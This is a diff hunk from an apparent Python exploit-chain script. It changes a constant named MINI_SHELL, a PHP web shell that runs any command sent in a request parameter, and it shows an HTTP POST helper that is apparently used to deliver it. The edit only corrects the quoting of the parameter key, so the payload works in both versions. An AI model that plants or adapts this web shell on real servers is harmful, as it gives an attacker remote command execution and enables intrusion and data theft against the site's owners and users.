@@ -36,7 +36,7 @@ sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
 
 from lib import chain as chain_mod  # noqa: E402
 
-MINI_SHELL = b"<?php echo shell_exec($_REQUEST[c]);"
+MINI_SHELL = b"<?php echo shell_exec($_REQUEST['c']);"
 
 
 def http_post(url: str, data: dict, timeout: float = 8.0) -> tuple[int, str]:
